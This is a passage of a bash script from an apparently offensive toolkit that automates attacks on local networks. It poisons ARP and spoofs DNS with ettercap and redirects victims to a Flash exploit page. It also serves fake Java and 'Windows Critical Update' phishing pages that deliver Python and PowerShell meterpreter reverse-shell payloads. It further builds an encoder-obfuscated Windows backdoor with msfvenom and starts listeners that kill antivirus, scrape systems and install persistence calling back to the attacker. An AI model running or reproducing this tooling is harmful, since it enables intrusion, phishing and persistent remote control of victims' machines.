      echo -n "[-]:{leave blank to poison all local network}(enter target ip address):"
      read victim

        # building index.htm with meta-tag injection
        cd $H0m3/opensource/priv8
        echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ index.html ]${Reset};
        sleep 1
        echo "<html><head></head><body>" > index.html
        echo "<title>$title</title><br /><br />" >> index.html
        echo "<center><b>ERROR:404:MISSING:ADDON:msf.swf</b></center>" >> index.html
        echo "<center>Pease wait redirecting to update...</center>" >> index.html
        echo "<link rel="shortcut icon" type="image/x-icon" a href="https://addons.cdn.mozilla.net/media/img/favicon.ico">" >> index.html
        echo "<meta http-equiv='refresh' content='5; url=http://$lhost:$lport/$uripath' />" >> index.html
        echo "</body></html>" >> index.html
        chown $user index.html


# copy msf.swf and adobe_flash_hacking_team_uaf.rb to metasploit
if [ -e $find/data/exploits/CVE-2014-0515/msf.swf ]; then
echo ${BlueF}[*]${RedF}:${BlueF}[hackingteam exploit]${RedF}:${GreenF}[ FOUND ]${Reset};
sleep 1
else
echo ${RedF}[x]:${BlueF}[hackingteam exploit]${RedF}:[ NOT FOUND ]${Reset};
sleep 1
cp $H0m3/opensource/modules/adobe_flash_hacking_team_uaf.rb $find/modules/exploits/multi/browser/adobe_flash_hacking_team_uaf.rb
mkdir $find/data/exploits/CVE-2014-0515
cp $H0m3/opensource/modules/msf.swf $find/data/exploits/CVE-2014-0515/msf.swf
echo ""
fi


cat << !

   exploit [hacking_team] Final Config:
   ===================================
   LHOST            : $lhost
   LPORT            : $lport
   HTML TITLE       : $title
   URIPATH          : $uripath
   EXPLOIT          : exploit/multi/browser/adobe_flash_hacking_team_uaf
   INJECTION     : <meta http-equiv='refresh' content='5; url=http://$lhost:$lport/$uripath'/>

   STORAGE IN       : $apache/index.html
   AFFECTED SYSTEMS : Windows 7 SP1 (32-bit), IE11 and Adobe Flash 18.0.0.194,
                      Windows 7 SP1 (32-bit), Firefox 38.0.5 and Adobe Flash 18.0.0.194,
                      Windows 8.1 (32-bit), IE11 and Adobe Flash 18.0.0.194,
                      Windows 8.1 (32-bit), Firefox and Adobe Flash 18.0.0.194, and
                      Linux Mint (32 bits), Firefox 33.0 and Adobe Flash 11.2.202.468.

!
      sleep 2
      # copy files to apache and start apache2 webserver
      cp index.html $apache/index.html
      xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
      echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

    # setting dns_spoofing attack
    echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
    read op
    xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"



   # chose target system OS to exploit
   if [ "$choset" = "linux systems" ]; then
     echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
     pass=$(zenity --list --title "POST EXPLOITATION" --text "If you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "Post-auto.rc" --width 350 --height 220) > /dev/null 2>&1


      if [ "$pass" = "Default listenner" ]; then
        # starting a metasploit listenner
        echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
        echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
        sleep 1
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
        echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
        sleep 2
        xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set TARGET 1; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/
          # cleanup script
          rm $H0m3/opensource/priv8/index.html > /dev/null 2>&1
          rm $apache/index.html > /dev/null 2>&1

      elif [ "$pass" = "Post-auto.rc" ]; then
        # starting a metasploit listenner (windows)
        zenity --info --title "WARNNING" --text "edit [ Post-Auto.rc ] and script your own code befor continuing, or continue to run settings stored.." --width 430 > /dev/null 2>&1
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
        echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
        sleep 1
        echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
        echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
        sleep 2
        xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set TARGET 0; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/
          # cleanup script
          rm $H0m3/opensource/priv8/index.html > /dev/null 2>&1
          rm $apache/index.html > /dev/null 2>&1

      else

        echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
        # cleanup script
        rm $H0m3/opensource/priv8/index.html > /dev/null 2>&1
        rm $apache/index.html > /dev/null 2>&1
        sleep 2
      fi

   else
      # chose target windows
      sh_pOst # jump to post-exploitation module
   fi
}


sh_pOst () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 450) > /dev/null 2>&1


      if [ "$pass" = "migrate" ]; then
      # starting a metasploit listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      sleep 1
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set AutoRunScript migrate -n $mig; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/


      elif [ "$pass" = "Default listenner" ]; then
      # starting a metasploit listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      sleep 1
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/


      elif [ "$pass" = "killav" ]; then
      # starting a metasploit listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      sleep 1
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set AutoRunScript killav; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/


      elif [ "$pass" = "scraper" ]; then
      # starting a metasploit listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      sleep 1
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set AutoRunScript scraper; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/


      elif [ "$pass" = "persistence" ]; then
      # starting a metasploit listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[spear phishing]${RedF}:${GreenF}[ ARP poison + DNS spoofing ]${Reset};
      sleep 1
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to exit meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/


      elif [ "$pass" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      zenity --info --title "WARNNING" --text "edit [ Post-Auto.rc ] and script your own code befor continuing, or continue to run settings stored.." --width 430 > /dev/null 2>&1
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner. ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      sleep 1
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      echo ${RedF}[x]:[warning]: press [q] to stop MITM attack ${Reset};
      sleep 2
      xterm -T "r00tsect0r - Automated exploit: adobe_flash_hacking_team_uaf" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/adobe_flash_hacking_team_uaf; set LHOST $lhost; set URIPATH $uripath; set LPORT $lport; set AutoRunScript multi_console_command -rc $H0m3/opensource/modules/Post-auto.rc; set JsObfuscate 3; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router/ /$victim/


   else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     # cleanup script
     rm $H0m3/opensource/priv8/index.html > /dev/null 2>&1
     rm $apache/index.html > /dev/null 2>&1
     sleep 2
fi
rm $H0m3/opensource/priv8/index.html > /dev/null 2>&1
rm $apache/index.html > /dev/null 2>&1
}










# -----------------------------------
# web_delivery PSH/PYTHON msf payload
# -----------------------------------
sh_driveby () {
Colors;

pass=$(zenity --list --title "WEB_DELIVERY MODULE" --text "chose payload format" --radiolist --column "Pick" --column "Option" TRUE "Python" FALSE "Powershell" --width 300 --height 160) > /dev/null 2>&1
   if [ "$pass" = "Python" ]; then
      sh_web_python
   elif [ "$pass" = "Powershell" ]; then
      sh_web_powershell
   else
     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     clear
   fi
}



sh_web_python () {
Colors;

   # get user input to build the payload
   echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
   srvhost=$(zenity --title="Input SRVHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
   filename=$(zenity --title="Input PAYLOAD name" --text "example: payload.py" --entry --width 300) > /dev/null 2>&1
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read router
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read target


      # use SED to replace SRVHOST in web_delivery.py
      cd $H0m3/opensource/modules/
      cp web_delivery.py web_delivery.bak
      sed "s/SRVHOST/$srvhost/g" web_delivery.py > copy.nt
      mv copy.nt web_delivery.py


         # buildidng meterpreter powershell invocation payload
         echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $filename ]${Reset};
         mkdir $tWd
         cd $tWd
         sleep 2
         # downloading phishing webpage from network
         echo ${BlueF}[*]${RedF}:${BlueF}[Download]${RedF}:${GreenF}[ java-exploit.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/java-exploit.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: java-exploit.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf java-exploit.tar.gz

            # copy files to apache webroot directory
            cd java-exploit
            cp -r index_files $apache/index_files
            cp metrics_group1.js $apache/metrics_group1.js
            cp jv0_search_btn.gif $apache/jv0_search_btn.gif
            cp popUp.js $apache/popUp.js
            cp print.css $apache/print.css
            cp s_code_remote.js $apache/s_code_remote.js
            cp screen.css $apache/screen.css
            cp index-jar.html $apache/index.html
            cp jv0h.jpg $apache/jv0h.jpg
            cp softdown.png $apache/softdown.png
            rm -f index-jar.html
            cp $H0m3/opensource/modules/web_delivery.py $apache/$filename
            cd $apache

         # replace strings in index.html using SED command
         sed "s/Payl04D/$filename/g" index.html > copy.html
         mv copy.html index.html
         # set privs on generated files
         chown $user $filename
         chown -R $user $apache/index_files
         chmod +x $filename



cat << !

     Payload [python] Final Config:
     ==============================
     SRVHOST          : $srvhost
     LPORT            : $lport
     FILENAME         : $filename
     STORAGE IN       : $apache/$filename
                        $H0m3/opensource/priv8/$filename
     PAYLOAD          : python/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Apple, BSD, Windows, Linux, solaris

!
         sleep 2
         # start apache webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

         # config dns_spoof plugin
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"


     # run listenner?
     QuE=$(zenity --question --title "web_delivery PYTHON payload" --text "\n   -:[ START A LISTENNER ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       xterm -T "r00tsect0r - Automated exploit: web_delivery PYTHON payload" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET 0; set PAYLOAD python/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /a; exploit'" & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
       zenity --info --title "BUILDING RC CONF FILE" --text "This exploit does not build a listenner.rc\nbecause it requires the 2º stage stored\nin metasploit HTTP server." --width 450 > /dev/null 2>&1

     # clean everything up
    /etc/init.d/apache2 stop
    rm $apache/index.html > /dev/null 2>&1
    rm $apache/jv0h.jpg > /dev/null 2>&1
    rm $apache/softdown.png > /dev/null 2>&1
    rm $apache/metrics_group1.js > /dev/null 2>&1
    rm $apache/jv0_search_btn.gif > /dev/null 2>&1
    rm $apache/popUp.js > /dev/null 2>&1
    rm $apache/print.css > /dev/null 2>&1
    rm $apache/s_code_remote.js > /dev/null 2>&1
    rm $apache/screen.css > /dev/null 2>&1
    mv $H0m3/opensource/modules/web_delivery.bak $H0m3/opensource/modules/web_delivery.py
    mv $apache/$filename $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    rm -r $tWd > /dev/null 2>&1
    rm -r $apache/index_files > /dev/null 2>&1
    chown $user $H0m3/opensource/modules/web_delivery.py > /dev/null 2>&1
    chown $user $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    cd $H0m3/opensource/
    clear

else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     # clean everything up
    /etc/init.d/apache2 stop
    rm $apache/index.html > /dev/null 2>&1
    rm $apache/jv0h.jpg > /dev/null 2>&1
    rm $apache/softdown.png > /dev/null 2>&1
    rm $apache/metrics_group1.js > /dev/null 2>&1
    rm $apache/jv0_search_btn.gif > /dev/null 2>&1
    rm $apache/popUp.js > /dev/null 2>&1
    rm $apache/print.css > /dev/null 2>&1
    rm $apache/s_code_remote.js > /dev/null 2>&1
    rm $apache/screen.css > /dev/null 2>&1
    mv $H0m3/opensource/modules/web_delivery.bak $H0m3/opensource/modules/web_delivery.py
    mv $apache/$filename $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    rm -r $tWd > /dev/null 2>&1
    rm -r $apache/index_files > /dev/null 2>&1
    chown $user $H0m3/opensource/modules/web_delivery.py > /dev/null 2>&1
    chown $user $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    cd $H0m3/opensource/
    clear
fi
}




sh_web_powershell () {
Colors;

   # get user input to build the payload
   echo ${BlueF}[*]${RedF}:${YellowF}[input payload settings]${Reset};
   srvhost=$(zenity --title="Input SRVHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
   filename=$(zenity --title="Input PAYLOAD name" --text "example: payload.bat" --entry --width 300) > /dev/null 2>&1
   html=$(zenity --title="Input HTML TITLE" --text "example: POWERSHELL SECURITY PATCH" --entry --width 300) > /dev/null 2>&1
   echo -n "[+]:{leave blank to poison all local network}(enter router ip address):"
   read router
   echo -n "[+]:{leave blank to poison all local network}(enter target ip address):"
   read target


         # buildidng meterpreter powershell invocation payload
         echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $filename ]${Reset};
         mkdir $tWd
         cd $tWd
         sleep 2
         # downloading phishing webpage from network
         echo ${BlueF}[*]${RedF}:${BlueF}[Download]${RedF}:${GreenF}[ FakeUpdate.tar.gz ]${Reset};
         wget -qq https://dl.dropboxusercontent.com/u/21426454/netool-kali/FakeUpdate.tar.gz | zenity --progress --pulsate --title "DOWNLOADING" --text="FILE: FakeUpdate.tar.gz" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
         tar -xf FakeUpdate.tar.gz
         cd FakeUpdate

            # copy files to apache webroot directory
            cp index.html $apache/index.html
            cp -r Fake_Update.aspx_files $apache/Fake_Update.aspx_files
            cp $H0m3/opensource/modules/web_delivery.bat $apache/$filename
            cd $apache
            # set privs on generated files
            chown $user $filename
            chmod +x $filename

         # replace strings in index.html using SED command
         sed "s/CriticalUpdate.exe/$filename/g" index.html > copy.html
         sed "s/Windows Critical Update/$html/g" copy.html > copy2.html
         mv copy2.html index.html
         rm -f copy.html



cat << !

     Payload [powershell] Final Config:
     ==================================
     SRVHOST          : $srvhost
     LPORT            : $lport
     FILENAME         : $filename
     STORAGE IN       : $apache/$filename
                        $H0m3/opensource/priv8/$filename
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Windows OS (PSH installed)

!
         sleep 2
         # start apache webserver
         xterm -T "r00tsect0r - start Apache webserver" -geometry 110x23 -e "/etc/init.d/apache2 start"
         echo ${BlueF}[*]${RedF}:${BlueF}[start apache2]${RedF}:${GreenF}[ OK ]${Reset};

         # config dns_spoof plugin
         echo ${BlueF}[*]${RedF}:${BlueF}[edit etter.dns]${RedF}:${YellowF}[ PRESS ENTER ]${Reset};
         read op
         xterm -T "r00tsect0r - DNS_SPOOF - press [ctrl+x] to quit" -geometry 110x23 -e "nano $confD"

     # run listenner?
     QuE=$(zenity --question --title "web_delivery PSH payload" --text "\n   -:[ START A LISTENNER ? ]:-" --width 300) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
       gnome-terminal -t "r00tsect0r - Automated exploit: web_delivery PSH payload" --geometry=148x28 --zoom=0.8 -e "sudo msfconsole -x 'use exploit/multi/script/web_delivery; set SRVHOST $srvhost; set TARGET 2; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST $srvhost; set LPORT $lport; set URIPATH /a; exploit'" & leafpad $apache/$filename & ettercap -T -Q -i $inter -P dns_spoof -M arp /$router// /$target//
       zenity --info --title "BUILDING RC CONF FILE" --text "This exploit does not build a listenner.rc\nbecause it requires the 2º stage stored\nin metasploit HTTP server." --width 450 > /dev/null 2>&1

     # clean everything up
    /etc/init.d/apache2 stop
    rm $apache/index.html > /dev/null 2>&1
    # rm $apache/$filename > /dev/null 2>&1
    mv $apache/$filename $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    rm -r $tWd > /dev/null 2>&1
    rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
    # rm $H0m3/opensource/modules/copy.nt > /dev/null 2>&1
    # mv $H0m3/opensource/modules/web_delivery.bak $H0m3/opensource/modules/web_delivery.bat > /dev/null 2>&1
    # chown $user $H0m3/opensource/modules/web_delivery.bat > /dev/null 2>&1
    chown $user $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    cd $H0m3/opensource/
    clear

else

     echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
     sleep 2
     # clean everything up
    /etc/init.d/apache2 stop
    rm $apache/index.html > /dev/null 2>&1
    # rm $apache/$filename > /dev/null 2>&1
    mv $apache/$filename $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    rm -r $tWd > /dev/null 2>&1
    rm -r $apache/Fake_Update.aspx_files > /dev/null 2>&1
    # rm $H0m3/opensource/modules/copy.nt > /dev/null 2>&1
    # mv $H0m3/opensource/modules/web_delivery.bak $H0m3/opensource/modules/web_delivery.bat > /dev/null 2>&1
    # chown $user $H0m3/opensource/modules/web_delivery.bat > /dev/null 2>&1
    chown $user $H0m3/opensource/priv8/$filename > /dev/null 2>&1
    cd $H0m3/opensource/
    clear
fi
}












# ----------------------------------
# NORMAL PAYLOADS
# ----------------------------------





# payload to exploit windows machines
sh_wind () {
Colors;

   # get user input to build the payload
   echo ${YellowF}[+]${RedF}:${YellowF}[input payload settings]${Reset};
   lhost=$(zenity --title="Input LHOST" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
   lport=$(zenity --title="Input LPORT" --text "example: 4444" --entry --width 300) > /dev/null 2>&1
   name=$(zenity --title="Name your EXE" --text "example: rootsector.exe" --entry --width 300) > /dev/null 2>&1

     # building encrypted payload
     echo ${BlueF}[*]${RedF}:${BlueF}[building]${RedF}:${GreenF}[ $name ]${Reset};
     xterm -T "r00tsect0r - building $name" -geometry 110x23 -e "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe > $H0m3/opensource/priv8/$name"


      # set permissions to file and copy to opensource folder
      cd $H0m3/opensource/priv8
      chmod +x $name

cat << !

     Payload [exe] Final Config:
     ===========================
     LHOST            : $lhost
     LPORT            : $lport
     FILENAME         : $name
     STORAGE IN       : $H0m3/opensource/priv8/$name
     PAYLOAD          : windows/meterpreter/reverse_tcp
     AFFECTED SYSTEMS : Windows OS

!
    # chose what to do with generated backdoor
    cH0=$(zenity --list --title "WINDOWS PAYLOAD" --text "Chose what to do with generated: $name" --radiolist --column "Pick" --column "Option" TRUE "start multi-handler (listenner)" FALSE "use host-a-file-attack" --width 340 --height 200) > /dev/null 2>&1

      if [ "$cH0" = "use host-a-file-attack" ]; then
      cp $H0m3/opensource/priv8/$name $H0m3/$name
      sh_powershell

        elif [ "$cH0" = "start multi-handler (listenner)" ]; then
        sh_ngh # jump to post-exploitation

      else
      # error funtion (aborted by user)
      echo ${RedF}[x]:[ABORTED]:[${YellowF} QUIT ${RedF}] ${Reset};
      sleep 2
      fi
}



sh_ngh () {
Colors;

# CHOSE WHAT POST-EXPLOITATION MODULE TO USE
echo ${BlueF}[*]${RedF}:${BlueF}[metasploit listenner]${RedF}:${GreenF}[ RUNNING ] ${Reset};
pass=$(zenity --list --title "POST EXPLOITATION" --text "\nDefault  :  dont migrate to system\nmigrate  :  migrate to -> $mig\nkillav  :  stop Anti-Virus process\nscraper  :  enumerate about everything\npersistence  :  start the backdoor in startup\nPost-auto.rc  :  run a list of post modules\n\nIf you chose to run Post-auto.rc handler then\nInput one-per-line the post modules to use into:\n$H0m3/opensource/modules/Post-auto.rc\n" --radiolist --column "Pick" --column "Option" TRUE "Default listenner" FALSE "migrate" FALSE "killav" FALSE "scraper" FALSE "persistence" FALSE "Post-auto.rc" --width 350 --height 434) > /dev/null 2>&1


      if [ "$pass" = "migrate" ]; then
      # starting a listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript migrate -n $mig; exploit'"
      sh_ejt # build resource file (shell_listenner.rc)


      elif [ "$pass" = "killav" ]; then
      # starting a listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript killav; exploit'"
      sh_ejt # build resource file (shell_listenner.rc)


      elif [ "$pass" = "scraper" ]; then
      # starting a listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript scraper; exploit'"
      sh_ejt # build resource file (shell_listenner.rc)


      elif [ "$pass" = "persistence" ]; then
      # starting a listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript persistence -U -i 5 -p 8080 -r $lhost; exploit'"
     # persistence listenner
     sh_perlis4


      elif [ "$pass" = "Default listenner" ]; then
      # starting a listenner
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
      sleep 2
      xterm -T "r00tsect0r - $name Listenner" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
      sh_ejt # build resource file (shell_listenner.rc)

      elif [ "$pass" = "Post-auto.rc" ]; then
      # starting a metasploit listenner (windows x86)
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ loading resource ] ${Reset};
      echo ${BlueF}[*]${RedF}:${BlueF}[please wait]${RedF}:${GreenF}[ start listenner ]${Reset};
      echo ${RedF}[x]:[warning]: press [ctrl+c] or [exit] to 'exit' meterpreter shell ${Reset};
